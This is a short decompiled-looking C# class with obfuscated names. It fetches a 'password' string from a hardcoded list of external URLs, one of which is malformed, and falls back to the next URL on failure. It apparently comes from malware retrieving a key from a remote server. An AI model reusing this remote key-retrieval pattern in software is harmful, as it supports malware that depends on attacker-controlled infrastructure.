using System;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

public static class GClass5
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class20
	{
		public static readonly Class20 class20_0 = new Class20();

		public static Func<string> func_0;

		internal string method_0()
		{
			string result = string.Empty;
			for (int i = 0; i < uri_0.Length; i++)
			{
				if (int_0 + 1 <= uri_0.Length)
				{
					try
					{
						WebClient webClient = new WebClient();
						result = webClient.DownloadString(uri_0[int_0]);
						int_0 = 0;
					}
					catch (Exception)
					{
						int_0++;
						continue;
					}
					break;
				}
				throw new Exception("Couldn't resolve password");
			}
			return result;
		}
	}

	private static int int_0 = 0;

	public static Uri[] uri_0 = new Uri[2]
	{
		new Uri("http://kuchnia-marty.eu/genpass/"),
		new Uri("https://tanopl/ass/")
	};

	public static async Task<string> smethod_0()
	{
		int_0 = 0;
		return await Task.Run(delegate
		{
			string result = string.Empty;
			for (int i = 0; i < uri_0.Length; i++)
			{
				if (int_0 + 1 <= uri_0.Length)
				{
					try
					{
						WebClient webClient = new WebClient();
						result = webClient.DownloadString(uri_0[int_0]);
						int_0 = 0;
					}
					catch (Exception)
					{
						int_0++;
						continue;
					}
					break;
				}
				throw new Exception("Couldn't resolve password");
			}
			return result;
		});
	}
}
